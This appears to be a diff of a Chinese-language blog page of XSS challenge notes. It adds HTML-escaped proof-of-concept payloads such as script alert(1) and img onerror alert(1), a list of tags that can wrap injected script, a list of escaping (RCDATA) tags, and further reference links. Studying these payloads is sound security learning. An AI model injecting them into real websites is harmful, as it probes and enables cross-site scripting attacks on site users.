@@ -90,13 +90,13 @@ ChallengesStage 1
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    18k
+                    19k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    17 mins.
+                    18 mins.
                 </span>
                 
                 
@@ -388,7 +388,15 @@ backgroud
 &lt;a href=javascript:alert(document.domain)&gt;xss&lt;/a&gt;
 
 &lt;img&gt;标签
-&lt;img src=x onerror=alert(document.domain)&gt;
+&lt;img src=1 onerror=alert(document.domain)&gt;
+
+外套： &lt;div&gt;[xss]&lt;/div&gt;
+payload： &lt;script&gt;alert(1)&lt;/script&gt; 或者 &lt;img src=1 onerror=alert(1)&gt; 
+这些外套有：
+&lt;a&gt; &lt;p&gt; &lt;img&gt; &lt;body&gt; &lt;button&gt; &lt;var&gt; &lt;div&gt; &lt;object&gt; &lt;input&gt; &lt;select&gt; &lt;keygen&gt; &lt;frameset&gt;  &lt;embed&gt; &lt;svg&gt; &lt;video&gt; &lt;audio&gt;
+
+自带HtmlEncode（转义）功能的标签(RCDATA)，这是插入的javascript不会被执行，除非我们闭合掉它们。
+&lt;textarea&gt;&lt;/textarea&gt; &lt;title&gt;&lt;/title&gt; &lt;iframe&gt;&lt;/iframe&gt; &lt;noscript&gt;&lt;/noscript&gt; &lt;noframes&gt;&lt;/noframes&gt; &lt;xmp&gt;&lt;/xmp&gt; &lt;plaintext&gt;&lt;/plaintext&gt; &lt;math&gt;&lt;/math&gt;
 </code></pre>
 <p><strong>编码</strong></p>
 <pre><code class="payload">html编码
@@ -411,6 +419,8 @@ Unicode编码
 <p><a href="http://suroot.cn/106.html" target="_blank" rel="noopener">http://suroot.cn/106.html</a></p>
 <p><a href="https://hpdoger.cn/2018/08/02/xss%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%EF%BC%88%E4%BA%8C%EF%BC%89%E4%B9%8B%E6%80%92%E5%88%B7xss-quiz/#challenge3-%E5%85%B6%E5%AE%83input%E6%A1%86%E7%9A%84xss" target="_blank" rel="noopener">https://hpdoger.cn/2018/08/02/xss%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%EF%BC%88%E4%BA%8C%EF%BC%89%E4%B9%8B%E6%80%92%E5%88%B7xss-quiz/#challenge3-%E5%85%B6%E5%AE%83input%E6%A1%86%E7%9A%84xss</a></p>
 <p><a href="https://www.leavesongs.com/PENETRATION/use-location-xss-bypass.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-location-xss-bypass.html</a></p>
+<p><a href="https://momomoxiaoxi.com/2017/10/10/XSS/" target="_blank" rel="noopener">https://momomoxiaoxi.com/2017/10/10/XSS/</a></p>
+<p><a href="https://wizardforcel.gitbooks.io/xss-naxienian/content/0.html" target="_blank" rel="noopener">https://wizardforcel.gitbooks.io/xss-naxienian/content/0.html</a></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls"
